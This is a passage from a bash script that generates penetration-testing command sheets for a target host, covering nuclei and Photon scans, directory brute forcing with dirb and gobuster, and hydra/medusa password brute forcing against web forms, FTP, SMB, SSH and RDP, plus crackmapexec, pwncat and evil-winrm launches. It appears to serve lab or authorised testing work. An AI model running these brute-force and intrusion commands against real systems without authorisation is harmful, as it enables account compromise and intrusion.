### auto-tools

\`\`\`bash
export tpls=(\"ns\" \"cves\" \"cnvd\" \"takeovers\" \"vulnerabilities\" \"file\" \"fuzzing\" \"miscellaneous\" \"exposed-panels\")
for tpl in \${tpls[@]}; do 
	touch ${loc}/6-misc-tools/autotools/\${tpl}_host.md
	docker run projectdiscovery/nuclei -v -t \$tpl -u ${hosturl}:\${web1} -o ${loc}/6-misc-tools/nuclei/\${tpl}_host.md
done

python3 /opt/Photon/photon.py -u ${hosturl}:\${web1} -l 10 --dns --clone --headers --keys -v -o ${loc}/6-misc-tools/photon_host/

\`\`\`" > ${loc}/cmds2run/host-specific/4-basic_web.md



seclist_dir=$(find / -type d -name \"SecLists\" 2>/dev/null | tr \"\n\" \",\" | cut -f1 -d \",\")
if [ -z \"$seclist_dir\" ]; then
	git clone https://github.com/danielmiessler/SecLists.git
	seclist_dir=$(find / -type d -name \"SecLists\" 2>/dev/null | tr \"\n\" \",\" | cut -f1 -d \",\")
fi
domain_list=\"${seclist_dir}/DNS/subdomains-top1000000.txt\"
directory_list1=\"/usr/share/wordlists/dirb/big.txt\"
directory_list2=\"/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\"
user_list=\"${seclist_dir}/Usernames/xato-net-10-million-usernames.txt\"
pass_list=\"${seclist_dir}/Passwords/xato-net-10-million-passwords-1000000.txt\"


	echo -e "

### Domain Bruteforce

\`\`\`bash
dnsrecon -d ${box_host} -D WORDLIST -t brt | tee ${loc}/2-enum/dns/dnsrecon_brute.md
\`\`\`

### Directory Brute Forcing

**HTTP**

\`\`\`bash
dirb ${hosturl}:\${web1} -o ${loc}/2-enum/web/dirb_host.md
\`\`\`

\`\`\`bash
dirb ${hosturl}:\${web1} -X .txt,.sh,.php,.pl,.py,.xml,.bak -o ${loc}/2-enum/web/dirb_host_ext.md

\`\`\`

\`\`\`bash
gobuster dir -u ${hosturl}:\${web1} -w ${directory_list2} -o ${loc}/2-enum/web/gob_dir.md
\`\`\`

\`\`\`bash
gobuster dir -u ${hosturl}:\${web1} -w ${directory_list2} -x log,txt,php,xml,csv,dat,pdf,doc,docx,ppt,pptx,xlr,xls,xlsx,db,dbf,mdb,pdb,sql,apk,jar,exe,7z,rar,tar.gz,zip,c,cpp,cs,h,sh,vb,vbs,pl,lua,java,py,bak,tmp -o ${loc}/2-enum/web/gob_files.md
\`\`\`

\`\`\`bash
gobuster dir -u ${hosturl}:\${web1} -w ${directory_list2} -x log,txt,pdf,xml,csv,bak,php,pl -o ${loc}/2-enum/web/gob_files_priority.md
\`\`\`
**HTTPS**

\`\`\`bash
gobuster dir -k -u ${hosturl}:\${web2} -w ${directory_list2} -o ${loc}/2-enum/web/gob_dir_https.md
\`\`\`

\`\`\`bash
gobuster dir -k -u ${hosturl}:\${web2} -w ${directory_list2} -x log,txt,php,xml,csv,dat,pdf,doc,docx,ppt,pptx,xlr,xls,xlsx,db,dbf,mdb,pdb,sql,apk,jar,exe,7z,rar,tar.gz,zip,c,cpp,cs,h,sh,vb,vbs,pl,lua,java,py,bak,tmp -o ${loc}/2-enum/web/gob_files_https.md
\`\`\`

\`\`\`bash
gobuster dir -k -u ${hosturl}:\${web2} -w ${directory_list2} -x log,txt,pdf,xml,csv,bak,php,pl -o ${loc}/2-enum/web/gob_files_priority_https.md
\`\`\`

### HTTP Form Brute Forcing

\`\`\`bash
hydra -L ${user_list} -P ${pass_list} -e nsr -o ${loc}/2-enum/http/hydra_http.md {http_scheme}-get ${box_host}/path/to/auth/area
\`\`\`

\`\`\`bash
medusa -U ${user_list} -P ${pass_list} -e ns -O ${loc}/2-enum/http/medusa_http.md -h ${box_host} -m DIR:/path/to/auth/area
\`\`\`

\`\`\`bash
hydra -L ${user_list} -P ${pass_list} -e nsr -o ${loc}/2-enum/http/hydra_http_host.md http-post-form ${box_host} \"/path/to/form:login_method:invalid-login-prompt\"
\`\`\`

\`\`\`bash
hydra -L ${user_list} -P ${pass_list} -e nsr -o ${loc}/2-enum/http/hydra_http_host.md https-post-form ${box_host} \"/path/to/form:login_method:invalid-login-prompt\"
\`\`\`

\`\`\`bash
medusa -U ${user_list} -P ${pass_list} -e ns -O ${loc}/2-enum/http/medusa_http_host.md -h ${box_host} -m FORM:/path/to/login.php -m FORM-DATA:\"post?username=&password=\" -m DENY-SIGNAL:\"invalid login message\"

\`\`\`

### FTP Brute Forcing

\`\`\`bash
hydra -L ${user_list} -P ${pass_list} -e nsr -o ${loc}/2-enum/ftp/hydra_ftp_host.md ftp://${box_host}
\`\`\`

\`\`\`bash
medusa -U ${user_list} -P ${pass_list} -e ns -O ${loc}/2-enum/ftp/medusa_ftp_host.md -M ftp -h ${box_host}

\`\`\`

### SMB Brute Forcing

\`\`\`bash
hydra -L ${user_list} -P ${pass_list} -e nsr -o ${loc}/2-enum/smb/hydra_smb_host.md smb://${box_host}
\`\`\`

\`\`\`bash
medusa -U ${user_list} -P ${pass_list} -e ns -O ${loc}/2-enum/smb/medusa_smb_host.md -M smb -h ${box_host}

\`\`\`

### SSH Brute Forcing

\`\`\`bash
hydra -L ${user_list} -P ${pass_list} -e nsr -o ${loc}/2-enum/ssh/hydra_ssh_host.md ssh://${box_host}
\`\`\`

\`\`\`bash
medusa -U ${user_list} -P ${pass_list} -e ns -O ${loc}/2-enum/ssh/medusa_ssh_host.md -M ssh -h ${box_host}

\`\`\`

### RDP Brute Forcing

\`\`\`bash
hydra -L ${user_list} -P ${pass_list} -e nsr -o ${loc}/2-enum/rdp/hydra_rdp_host.md rdp://${box_host}
\`\`\`

\`\`\`bash
medusa -U ${user_list} -P ${pass_list} -e ns -O ${loc}/2-enum/rdp/medusa_rdp_host.md -M rdp -h ${box_host}

\`\`\`" > ${loc}/cmds2run/host-specific/5-brute_forcing.md

	echo -e "

### SNMP

\`\`\`bash
snmp-check ${box_ip}
\`\`\`

### Crackmapexec

\`\`\`bash
docker run -it --entrypoint=/bin/sh --name crackmapexec -v ~/.cme:/root/.cme byt3bl33d3r/crackmapexec
\`\`\`

### PWNCat
\`\`\`bash
docker run -v \"./\":/work -t pwncat $box_ip LPORT
\`\`\`

### EvilWinRM

\`\`\`bash
export scripts_dir='/opt/server/ps_scripts/'; export exe_dir='/opt/server/exe/'; docker run --rm -ti --name evil-winrm -v \${scripts_dir}:/ps1_scripts -v \${exe_dir}:/exe_files -v \${pwd}:/data oscarakaelvis/evil-winrm
\`\`\`" > ${loc}/cmds2run/host-specific/6-other_services.md

}

##############################
# 		      Start 		       #
##############################

start() {
if [ -d ${loc}/cmds2run ]; then
  printf \"${YELLOW}[-]${NC} Directory ${loc}/cmds2run exists \n\"
  printf \"${YELLOW}[-]${NC} Skipping basic commands  \n\"
else
  printf \"${GREEN}[+]${NC} Generating basic commands in:\n    ${BLUE}${loc}/cmds2run/ \n\"
  mkdir -p \"${loc}/cmds2run\"
  gen_basic_commands
fi

if [ -z $box_ip ]; then
    printf \"${YELLOW}[-]${NC} No IP address provided \n\"
    printf \"${YELLOW}[-]${NC} Skipping ip-specific commands  \n\"
else 
    if [ -d ${loc}/cmds2run/ip-specific ]; then
        printf \"${YELLOW}[-]${NC} Directory ${loc}/cmds2run/ip-specific exists \n\"
        printf \"${YELLOW}[-]${NC} Skipping ip-specific commands  \n\"
    else
        printf \"${GREEN}[+]${NC} Generating ip-specific commands for:\n    ${BLUE}${box_ip}  \n\"
        mkdir -p \"${loc}/cmds2run/ip-specific\"
        gen_ip_commands
        printf \"${GREEN}[+]${NC} ip-specific commands generated in:\n    ${BLUE}${loc}/cmds2run/ip-specific/  \n\"
    fi
fi

if [ -z ${box_host} ]; then
    printf \"${YELLOW}[-]${NC} No hostname provided \n\"
    printf \"${YELLOW}[-]${NC} Skipping host-specific commands  \n\"
else
    if [ -d ${loc}/cmds2run/host-specific ]; then
        printf \"${YELLOW}[-]${NC} Directory ${loc}/cmds2run/host-specific exists \n\"
        printf \"${YELLOW}[-]${NC} Skipping host-specific commands  \n\"
    else
        printf \"${GREEN}[+]${NC} Generating host-specific commands for:\n    ${BLUE}${box_host}  \n\"
        mkdir -p \"${loc}/cmds2run/host-specific\"
        gen_host_commands
        printf \"${GREEN}[+]${NC} host-specific commands generated in:\n    ${BLUE}${loc}/cmds2run/host-specific/  \n\"
    fi
fi
}
start

chmod -R 777 ${loc}/